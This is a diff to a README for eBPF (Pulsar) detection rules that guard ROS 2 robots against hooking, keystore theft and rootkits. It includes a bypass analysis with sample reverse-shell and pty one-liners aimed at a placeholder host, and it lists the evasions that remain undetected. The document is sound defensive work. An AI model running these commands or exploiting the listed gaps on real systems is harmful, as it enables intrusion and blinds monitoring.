@@ -49,8 +49,9 @@ Everything below was checked against the vendored Pulsar at rev `4796504`
 | `payload.argv` (`Argv`) | **Only `CONTAINS`**, which matches **one whole argv element exactly**. It cannot match a substring of the command line. `argv[0]` is included. If argv is longer than the probe buffer, it arrives **empty**. |
 | `payload.flags` (`FileFlags`) | **Only `CONTAINS`**, with one of `O_RDONLY O_WRONLY O_RDWR O_CREAT O_EXCL O_NOCTTY O_TRUNC O_APPEND O_NONBLOCK O_DIRECTORY`. The access modes are compared as an equality test on the mode, and the other flags as a bit test. |
 | `*.ip` (`IpAddr`) | **Only relational operators.** There is no `STARTS_WITH`, so write a CIDR as a `>=` / `<=` range. Every IPv4 address sorts before every IPv6 address. |
-| `header.image` | The process image **at the time of the event**. On an `Exec` event it is the **new** image (the same as `payload.filename`), **not the parent**. Pulsar exposes only `header.parent_pid`. |
-| `Exec payload.filename` | `bprm->filename` as passed to execve when the path is absolute (it is **not** symlink-resolved: `/bin/sh` stays `/bin/sh`), or the resolved path when it is relative. This is why the rules use `ENDS_WITH "/name"`. |
+| `header.image` | The process image **at the time of the event**. On an `Exec` event it is the **new** image (the same as `payload.filename`), **not the parent**. Pulsar exposes only `header.parent_pid`. It is the execve path **verbatim** (not normalised, not symlink-resolved), so it is attacker-chosen: any binary can be *named* `dpkg` or exec'd as `/opt/ros/x/../../../tmp/y`. See [Exclusion policy](#exclusion-policy). |
+| File-event paths | `FileOpened`/`FileCreated`/`FileRename`/`FileLink`/`ElfOpened` paths come from `get_path_str` (a dentry walk), so they are resolved: no `..`, no symlink components. Directory prefixes on these are sound, with the limits in [Bypass analysis](#bypass-analysis) (bind mounts, >100 components, containers). |
+| `Exec payload.filename` | `bprm->filename` as passed to execve when the path is absolute (it is **not** symlink-resolved: `/bin/sh` stays `/bin/sh`), or the resolved path when it is relative. `fexecve`/`execveat(AT_EMPTY_PATH)` (including memfd payloads) give `/dev/fd/N`. This is why the rules use `ENDS_WITH "/name"` and treat non-canonical and fd/`/proc` exec paths as signals of their own. |
 | `header.container` | `Option`: use `header.container.is_some()` or `header.container?.image`. |
 | Event types | `FileCreated FileDeleted DirCreated DirDeleted FileOpened FileLink FileRename ElfOpened Fork Exec Exit ChangeParent CredentialsChange Bind Listen Connect Accept Close Receive DnsQuery DnsResponse Send Custom Empty` |
 | Connect payload | `destination.{ip,port}` and `is_tcp`. The module README mentions a `source` field, but the struct has none. |
@@ -71,22 +72,206 @@ The harness uses only the Python standard library (3.11+ for `tomllib`). It:
 3. Type-checks every `header.*` / `payload.*` path, operator and literal
    against a schema embedded in the script. Each entry carries a comment with
    the Pulsar source file and line it came from.
-4. Runs `scripts/rules_fixtures.json`: 90 sample events, with at least one
+4. Runs `scripts/rules_fixtures.json`: 181 sample events, with at least one
    positive and one negative per rule. They are evaluated with the engine's
    matching semantics. Fixtures marked `KNOWN GAP` document misses on purpose.
 5. If the Pulsar source is available, it also re-extracts `Payload`, `Header`,
-   `Host`, `Category` and `UserRule` from the source and **fails on drift**. It
-   then validates Pulsar's own 89 shipped rules, which upstream's
+   `Host`, `ContainerInfo`, `Category`, `Severity` and `UserRule` from the
+   source and **fails on drift**. It checks the grammar itself against
+   `dsl.lalrpop` (operator tokens, keywords, every terminal, and fingerprints
+   of the productions the checker hard-codes: AND/OR equal precedence, NOT on
+   one simple condition, IN, literal regexes, no unescaping), and the operator
+   families each field type accepts against the Validatron impls
+   (`builtins.rs`, `Argv`/`FileFlags` in `event.rs`, `ModuleName`) plus the
+   `FileFlags` names. A built-in mutation test proves these drift checks fire
+   (renamed or added operator, OR given its own precedence, `IpAddr` gaining
+   `STARTS_WITH`, ...). It then validates Pulsar's own 89 shipped rules, which upstream's
    `shipped_rules_are_valid` test proves compile in the real engine. That
    calibrates the checker.
-6. Runs a self-test of 31 cases that must be rejected or accepted. This
-   includes the original `robot.toml`.
+6. Runs a self-test of 87 cases that must be rejected or accepted. This
+   includes the original `robot.toml`, the review PoC literals, and a corpus
+   of literals whose expected result was produced by the Rust std parsers.
 
-The last run gave: self-test 31/31; 89/89 upstream rules accepted; no schema
-drift; 31 RoboDR rules in 7 files; 90/90 fixtures pass; 0 errors and 0
-warnings. Mutation checks showed the harness catches problems: flipping every
+The last run gave: self-test 87/87; drift mutation test 12/12; 89/89
+upstream rules accepted; no schema or grammar drift; 44 RoboDR rules in 7
+files; 181/181 fixtures pass; 0 errors and 0 warnings (`--strict`). Mutation checks showed the harness catches problems: flipping every
 negative fixture gave 44 errors, and changing `argv: Argv` in a copy of
 `event.rs` was reported as drift.
+
+### Validator vs. Rust parsing (literals)
+
+A literal the Rust side cannot parse makes `RuleEngine::new` fail, which
+disables **every** rule, Pulsar's included. The validator therefore mirrors
+the Rust `FromStr` impls validatron calls, not Python's:
+
+| Type | Rust parser | Accepted |
+|---|---|---|
+| `i32` | `i32::from_str` | `^[+-]?[0-9]+$` (ASCII), in range. |
+| `u32`/`u16`/`usize` | `uN::from_str` | `^\+?[0-9]+$` (ASCII, **no** `-`, not even `-0`), in range. |
+| `IpAddr` | `std::net::IpAddr::from_str` | ASCII dotted quad without leading zeros, or RFC 4291 text form (embedded IPv4 allowed). **No** zone id (`%eth0`), brackets or whitespace. |
+| `bool` | `bool::from_str` | exactly `true` / `false`. |
+| `FileFlags` | name lookup in `event.rs` | the ten flag names. |
+| `String`, `ModuleName`, `Argv` | infallible | anything. |
+
+Python's `int()` accepts `1_000`, `" 7 "` and full-width digits, and
+`ipaddress` accepts `fe80::1%eth0`; the old validator used them and passed
+rules that would have taken the engine down (review finding). The new parsers
+were checked against a small Rust program (rustc 1.97, `u32`/`i32`/`u16`/
+`usize`/`bool`/`IpAddr::from_str`) over ~310k random literals with no
+disagreement (re-run for this change); the Rust-generated corpus is part of `--self-test`. The lexer's
+whitespace class is also the Rust regex `\s` (Unicode White_Space), not
+Python's `\s`, which additionally matches `\x1c`-`\x1f`.
+
+## Exclusion policy
+
+Every exclusion (`AND NOT ...`) is a bypass waiting to happen if the attacker
+controls the matched string. Rules here follow these rules:
+
+* **`header.image` exclusions use exact paths** (`== "/usr/bin/dpkg"`, plus
+  `/bin/dpkg` for usr-merged systems where both are the same file). Never
+  `ENDS_WITH "/dpkg"`: the review showed `/root/.cache/dpkg` writing a rootkit
+  `.ko` unflagged. A non-canonical spelling of the real path (`/usr/bin/../bin/dpkg`)
+  is not excluded, which fails safe (the rule fires).
+* **`header.image` prefix allowlists** (enclave key reader) also require
+  `NOT header.image CONTAINS "/../"`, and the install tree they trust is
+  watched for writes, renames **and links** (`ros2_stack.toml`).
+* **File-path prefixes** on `payload.*` are fine (kernel-resolved), as long as
+  the directory is itself write-protected or watched.
+* **File-name allowlists** (RMW libraries) are anchored to the dpkg-managed
+  `/opt/ros/` tree, so borrowing an allowlisted name elsewhere does not help.
+* The real `/usr/bin/dpkg` run with an injected library (`LD_PRELOAD`) writes
+  as "dpkg". Two rules watch what dpkg loads (a `.so` outside the system
+  library paths, or any ELF with `elf_check`); a hook with no `.so` name and
+  `elf_check` off is still missed, and so is a hook placed inside
+  `/usr/lib` (which needs root and trips the library-write rules).
+
+## Deployment: ELF check and noexec (needed for full hook coverage)
+
+The dynamic loader maps any file `LD_PRELOAD` names, whatever its name. Name
+rules (`*.so`) cannot see `/home/robot/.cache/hook`. Coverage, strongest first:
+
+1. **Mount `/tmp`, `/var/tmp`, `/dev/shm` and `/run/user` with `noexec`.** The
+   kernel then refuses `PROT_EXEC` mappings of files there, so a staged hook
+   cannot be loaded at all. This is prevention, not detection; do it on the
+   image. (`/dev/shm` is not covered by any name-independent FileOpened rule,
+   because DDS shared-memory transports open arbitrary files there.)
+2. **Enable Pulsar's ELF check** so the two `ElfOpened` rules work:
+   ```toml
+   [module.file-system-monitor]
+   enabled = true
+   elf_check = true
+   elf_check_whitelist = ["/proc", "/sys", "/dev"]
+   ```
+   `elf_check` (default **false**) makes pulsard open every opened file and
+   read its magic (`file-system-monitor/src/lib.rs` `check_elf`/`is_elf`), and
+   emits a derived `ElfOpened` event with the original header. Keep `/dev`
+   whitelisted: pulsard would otherwise open device nodes (a watchdog device
+   arms on open). Limits: the check runs **after** the open, in pulsard's mount
+   namespace, so a hook unlinked right after loading, or a path that only
+   exists inside a container, is missed. CPU cost is one extra open+read per
+   file open; Pulsar logs a warning when a check takes >10 ms. **Not measured on
+   the target controller.**
+3. Without `elf_check`, the FileOpened fallback catches `*.so` names anywhere
+   outside the allowlist, plus **any** read-only open by a ROS process from
+   `/tmp`, `/var/tmp`, `/run/user` or a `~/.cache` tree, and any new file (any
+   name) in the system library directories.
+
+## Bypass analysis
+
+What an attacker can do to a string-matching rule depends on where the string
+comes from. Two very different sources:
+
+* **File-event paths** (`FileOpened`, `FileCreated`, `FileDeleted`,
+  `FileRename`, `FileLink`, `ElfOpened`) are rebuilt by `get_path_str` from the
+  dentry and mount the kernel actually used. `..`, `.`, `//`, symlinks in the
+  path and relative paths are gone. Case cannot be played with either (Linux
+  file systems are case-sensitive; vfat/exfat media are the exception and
+  only matter to name rules such as `.ko`).
+* **Exec paths** (`Exec payload.filename`, and `header.image` of every later
+  event of that process) are `bprm->filename` **verbatim** when the path is
+  absolute. Nothing is normalised or resolved. `argv[0]` is never used to
+  identify a program here (it is free text), but the exec path is just as
+  attacker-chosen whenever the attacker runs the program.
+
+### Closed by rules in this directory
+
+| Evasion | Closed by |
+|---|---|
+| Binary *named* `dpkg` (`/root/.cache/dpkg`) writing modules/libraries/nodes | Exact-path `header.image == "/usr/bin/dpkg"` exclusions everywhere (review finding). |
+| Hook library without `.so` in its name (`/home/robot/.cache/hook`) | Any-name read arm for staging directories; `ElfOpened` rules (need `elf_check`). |
+| `/usr/../tmp/x`, `//tmp/x`, `/./tmp/x` to dodge "executed from a temporary directory" | **Program executed through a non-canonical path.** |
+| `//opt/ros/...` or `/opt/ros/a/../a/...` so a hooked ROS node falls outside the `/opt/ros/` scope | Same rule (fires at exec); the enclave-key allowlist also rejects `/../`. |
+| `/proc/self/exe`, `/proc/<pid>/exe`, `/proc/<pid>/root/...`, `fexecve`/`execveat` on an fd, `memfd_create` "fileless" payloads (`/dev/fd/N`) | **Program executed from a file descriptor or /proc path.** |
+| `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `perl -e`, `node -e`: a shell with no `-i` | **Interpreter one-liner executed.** |
+| `bash -c 'bash >& /dev/tcp/h/p 0>&1'` (no `-i`, no extra binary) | **Shell or netcat-style tool opened a network connection.** |
+| `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `GCONV_PATH`: all make the loader open an ELF | Library/ELF rules (by name and, with `elf_check`, by content). |
+| `PYTHONPATH`, `PYTHONHOME`, user site-packages, `sitecustomize`/`.pth`: code inside a trusted rclpy node or the `ros2` CLI, under a trusted `/opt/ros` image | **ROS 2 process imported Python code from outside the allowlisted paths.** |
+| `ROS_SECURITY_KEYSTORE` / `ROS_SECURITY_ENCLAVE_OVERRIDE` pointing a node at an attacker keystore (attacker governance/permissions) | **SROS 2 security files loaded from outside the commissioned keystore.** |
+| `LD_PRELOAD` into the *real* `/usr/bin/dpkg` to borrow its trusted image | **Package manager loaded a library / mapped an ELF from outside the system paths.** |
+| `/bin/python3` instead of `/usr/bin/python3` (usr-merged) to leave the Python scope | Both spellings are in scope. |
+| Staging in `/run/lock` or `/var/crash` (world-writable on Ubuntu) | Added to every temp-directory list. |
+| `python3 -mpip install` | Added to the pip rule. |
+| Write a module/library/node under a harmless name, then rename | `FileRename` rules on the destination. |
+| Hard link to an enclave key from an innocuous path, then read that | Link rule (hard-link target is a resolved path). |
+| IPv4-mapped IPv6 (`::ffff:8.8.8.8`) to dodge the IPv4 private ranges | Not in any allowlisted range, so the connect rule fires (fixture). |
+
+### Inherent to eBPF/path matching (documented, not closed by rules)
+
+These are limits of what Pulsar's probes record, not tuning mistakes. Each
+needs prevention (hardening) or a probe change.
+
+* **Renamed or copied tools.** Exec rules identify tools by name
+  (`ENDS_WITH "/gdb"`, `/bluetoothctl`, `/pip3`, shells). A copy under
+  another name (`/opt/x/kworker -i`) is a different file name; only the
+  temp-directory and non-canonical rules can still see it, and a copy in, say,
+  `/home/robot/bin` is invisible. A symlinked *directory* (`/home/u/l -> /tmp`,
+  exec `/home/u/l/x`) also defeats the temp-directory rule. Prevention: mount
+  staging directories `noexec`, remove the tools from the image.
+* **Exec-path exclusions trust argv and parent_pid.** The systemd-executor
+  exclusion can be mimicked by root (double fork to PID 1 + copied argv); a
+  fixture records it.
+* **No environment, no parent image.** Pulsar's `Exec` event has neither.
+  `ROS_SECURITY_ENABLE=false` / `ROS_SECURITY_STRATEGY=Permissive` (security
+  switched off) leave **no** file trace at all: nothing is opened. Inline DDS
+  configuration (`CYCLONEDDS_URI='<CycloneDDS>...'`) is likewise invisible;
+  file-based DDS profiles are not watched. `AMENT_PREFIX_PATH` pointing
+  `ros2 launch` at another install tree is only seen if that tree is under a
+  staging directory or the launched binaries trip another rule.
+* **Interpreters with code on stdin or from a file in an allowlisted
+  directory.** `python3 - < payload`, `python3 -Ssc` (unlisted bundle), and a
+  reverse shell written with `socket` in Python (the shell-connect rule covers
+  shells and nc-style tools, not interpreters). Fixtures record these.
+* **argv matching is exact per element.** Bundled options outside the listed
+  set (`bash -xvi`, `dpkg -iE`) and `python3 /usr/bin/pip3 install` are missed;
+  the file-based backstops (package database, Python import) still fire.
+* **Kill by PID or by pattern.** `kill -9 <pid>`, `pkill puls`, `systemctl stop
+  'puls*'` are not recognisable as "stop Pulsar". A dead sensor has to be
+  detected by absence (heartbeat at the SOC), not by a rule.
+* **File operations Pulsar has no hook for:** `truncate(2)` by path,
+  `chmod`/`chown`/`setxattr`, `mount` (a bind mount over `/etc/pulsar/rules`
+  or over the keystore changes what later opens resolve to and what paths
+  look like: a key read through a bind mount of `enclaves/` is reported under
+  the mount point, without `/enclaves/`), `ptrace`, `process_vm_writev`,
+  `init_module`/`finit_module` (a module file with no `.ko` name is invisible;
+  enforce `module.sig_enforce=1`/lockdown or `kernel.modules_disabled=1`).
+  Unprivileged user namespaces make bind mounts available to non-root users:
+  disable them (`kernel.apparmor_restrict_unprivileged_userns=1` on Ubuntu
+  24.04, or `user.max_user_namespaces=0`).
+* **Path reconstruction limits.** `get_path_str` keeps at most 100
+  components and walks at most 100 steps: a file more than ~100 directories
+  deep loses its **leading** components, so prefix rules (`STARTS_WITH
+  "/tmp/"`) miss it while suffix rules and allowlists (deny-by-default `NOT
+  STARTS_WITH ...`) still fire. Paths inside containers are container-relative.
+  Files opened through `open_by_handle_at` (root) can have disconnected
+  dentries and partial paths.
+* **Writes through an fd opened before pulsard started**, or passed in over a
+  UNIX socket, produce no new open event.
+* **Injection into an already trusted process.** Code running inside a ROS
+  node (via ptrace, `/proc/<pid>/mem` from a debugger copy, or an exploit)
+  acts under that node's image; the `/proc/<pid>/mem` write rule sees only the
+  `/proc` route.
+* **`elf_check` races.** It reads the file after the open, from pulsard's
+  mount namespace: a hook unlinked immediately after loading is missed.
 
 ## The rules
 
@@ -98,6 +283,8 @@ TUNE values that must be set per robot during commissioning:
 * The commissioned RMW library.
 * Service names.
 * The image of the signed update agent.
+* `/opt/robot_keystore/`: the commissioned SROS 2 keystore root.
+* The systemd-executor exclusion (systemd >= 255 only).
 
 Each of these is marked `TUNE` in the files.
 
@@ -109,16 +296,19 @@ Each of these is marked `TUNE` in the files.
 | ROS 2 process connects outside the robot's networks | C2 / datalink compromise, exfiltration of stolen keys | Only covers C++ nodes under the two prefixes. rclpy nodes run as `/usr/bin/python3.x` and are not covered. Allowlist the fleet gateway if it sits outside private space. UDP DDS traffic mostly uses `sendto`, not `connect`, so this rule mostly sees TCP plus connected UDP. |
 | ROS 2 install tree written outside the package manager | Trojaned/modified node, launch or param files | Root-run rclpy nodes writing `__pycache__`. Fix this by precompiling at commissioning or running nodes unprivileged. `colcon build` on the unit is a dev-only activity. |
 | File created or moved into the ROS 2 install tree… | Same, via atomic replace | Same as above. |
+| Link created inside the ROS 2 install tree… | Symlink/hard link that makes an attacker binary run under a trusted `/opt/...` image path, or swaps a node | `colcon build --symlink-install` on the unit (dev only). |
+| Shell or netcat-style tool opened a network connection | Reverse shell without `-i` (`bash >& /dev/tcp/...`), raw-socket C2 | None expected: shells do not open sockets. Destinations inside the cell are deliberately not excluded. |
 
 ### `sros2_keystore.toml`: SROS 2 keystore (Sakib et al. 2025; captured unit)
 
 | Rule | Threat | False positives / notes |
 |---|---|---|
 | Enclave private key read by a process outside the ROS stack | Keystore exfiltration → authenticated rogue participant | rclpy nodes (python3) and the `ros2` CLI with security enabled. Allowlisting python3 is a deliberate trade-off (see the file header). Backup tools. |
-| CA private key accessed on robot | CA keys must never be on a unit | None in a correct deployment. A hit means the keystore was provisioned wrongly or is being stolen. |
+| CA private key accessed on robot | CA keys must never be on a unit | None in a correct deployment. Matches only the SROS 2 names `private/{ca,identity_ca,permissions_ca}.key.pem`, so ordinary TLS keys such as `/etc/ssl/private/server.key.pem` no longer match. |
 | Keystore file written | Widened permissions / swapped identity | Re-provisioning during commissioning. |
 | Keystore file renamed or replaced | Same, by atomic rename, or a key moved out | Same. |
 | Link created to an SROS 2 private key | Reading the key via an innocuous path | Matches any `*key.pem` target, so TLS keys named like that elsewhere also match. |
+| SROS 2 security files loaded from outside the commissioned keystore | `ROS_SECURITY_KEYSTORE` redirected to an attacker keystore (attacker governance/permissions) | Set the keystore root (TUNE). Re-provisioning into a new directory. |
 
 ### `runtime_hooking.toml`: one-env-var hook ("Seeing is Not Believing", 2026)
 
@@ -128,15 +318,23 @@ effect: the loader opening the library.
 
 | Rule | Threat | False positives / notes |
 |---|---|---|
-| ROS 2 process loaded a library outside allowlisted paths | LD_PRELOAD / LD_LIBRARY_PATH hook into a node | Covers every `python3` process, not only ROS ones: venvs, `pip --user` and vendor SDK directories. Add vendor SDK library directories during commissioning. |
+| ROS 2 process loaded a library outside allowlisted paths | LD_PRELOAD / LD_LIBRARY_PATH hook into a node (`*.so` anywhere, or any name read-only from `/tmp`, `/var/tmp`, `/run/user`, `~/.cache`) | Covers every `python3` process, not only ROS ones: venvs, `pip --user`, vendor SDK directories, and nodes that read their own data from `/tmp`. Add vendor SDK library directories during commissioning. |
+| ROS 2 process mapped an ELF from outside the allowlisted paths (`ElfOpened`) | Same hook, by **content** (any file name) | Needs `elf_check = true`. A launch file exec'ing a binary from a non-standard directory. |
+| ELF opened from a world-writable or user cache directory (`ElfOpened`) | Staged hook / implant, any process, any name | Needs `elf_check = true`. Compilers writing objects to `/tmp`. |
 | ROS 2 process loaded `/etc/ld.so.preload` | Persistent system-wide hook | None: the file should not exist. Expect one hit per node start while it does. |
-| Unexpected RMW library loaded | `RMW_IMPLEMENTATION` pointed at a malicious RMW | Set the allowlist to the robot's RMW. Library names vary by distro: **verify them on the real install**. Tools that enumerate RMWs (for example `ros2 doctor`) may also match. |
+| Unexpected RMW library loaded | `RMW_IMPLEMENTATION` pointed at a malicious RMW (allowlisted names count only under `/opt/ros/.../lib/`) | Set the allowlist to the robot's RMW. Library names vary by distro: **verify them on the real install**. Tools that enumerate RMWs (for example `ros2 doctor`) may also match. |
 | Shared library opened from a temporary directory | Staged hook library | PyInstaller onefile apps and self-extracting vendor installers. |
 | Program executed from a temporary directory | Dropper / implant | Vendor installers and build systems. |
-| Shared library written into a system library path outside dpkg | A hook planted where the allowlist trusts it | Manual `make install` and DKMS. |
+| Shared library written into a system library path outside dpkg | A hook planted where the allowlist trusts it; **any** file name, since the loader does not care | Manual `make install`, DKMS, root-run Python byte-compiling into `/usr/lib/python3`. |
+| File moved into a system library path or linker configuration outside dpkg | The same via create-elsewhere-then-rename | Same. |
 | Dynamic linker search path changed | Persistent `LD_LIBRARY_PATH` | Non-dpkg installers. |
 | Process memory written through `/proc` | Code injection into a running node (T1055.009). Covers part of the ptrace idea. | gdb. Pulsar's upstream rule already covers *reads* of `/proc/*/mem` at low severity. |
 | Debugger or tracer started | ptrace-based key theft or patching (Pulsar has no ptrace event) | Field debugging sessions, which should not happen on a fielded unit. |
+| Program executed from a file descriptor or /proc path | memfd / `fexecve` fileless payloads, `/proc/self/exe` re-exec that escapes path scopes | systemd >= 255 unit starts (`/proc/self/fd/N`, excluded; the exclusion is spoofable by root), runc. |
+| Program executed through a non-canonical path | `//opt/ros/...`, `/usr/../tmp/x`: respelt exec paths that dodge scopes and prefixes | Shell scripts that exec `$(dirname "$0")/../bin/x`. |
+| ROS 2 process imported Python code from outside allowlisted paths | `PYTHONPATH` / `sitecustomize` / `.pth` / user site-packages hook inside an rclpy node or the `ros2` CLI | Python run on scripts outside the allowlisted trees; robot Python packages outside them (TUNE). |
+| Interpreter one-liner executed | `python3 -c` pty upgrade, `perl -e` reverse shell | Helper scripts using `python3 -c`; rare `python3 -E` / `node -r`. |
+| Package manager loaded a library / mapped an ELF from outside the system paths (2 rules) | `LD_PRELOAD` into the real dpkg to borrow the image every write rule trusts | `dpkg --verify` of packages that ship ELF/.so outside the system and `/opt/ros` trees. |
 
 ### `supply_chain.toml`: trojaned package (Sakib et al. 2025; supply chain)
 
@@ -164,6 +362,9 @@ tools and the configuration files instead.
 |---|---|---|
 | Kernel module file written outside dpkg | Rootkit staging (also catches loaders that call `finit_module` directly and drop a `.ko`) | DKMS rebuilds after kernel updates. |
 | Module autoload configuration changed | Boot persistence / blacklisting security modules | Non-dpkg driver installers. |
+| Kernel module file or autoload configuration moved into place outside dpkg | The two above via rename (no create/write event on the target name) | Same. |
+
+"dpkg" in every rule above means the exact image `/usr/bin/dpkg` or `/bin/dpkg`.
 
 Pulsar's upstream `persistence/kernel_module_injection.toml` already covers
 `insmod` and `modprobe` being run (high severity), so that is not duplicated
@@ -226,6 +427,13 @@ probes emit. The following need checking on the target controller, with
   names for the robot's distro.
 * That the DDS security plugin (Fast DDS / Cyclone) reads `key.pem` from the
   node process, so that `header.image` is the node binary.
+* That dpkg's `header.image` is exactly `/usr/bin/dpkg` (apt's default
+  `Dir::Bin::dpkg`) or `/bin/dpkg` on the target, so the exact-path exclusions
+  do not turn every package install into alerts. A process that was already
+  running when pulsard started gets its image from `/proc/<pid>/exe`
+  (resolved, i.e. `/usr/bin/dpkg` on usr-merged systems).
+* That `ElfOpened` (derived event) reaches the rules engine with the original
+  header, and the cost of `elf_check = true` on the controller.
 * That dpkg maintainer-script exec events carry `/var/lib/dpkg/info/...` as
   `filename`, and that dpkg's `.list-new` → `.list` rename is reported as
   `FileRename`.
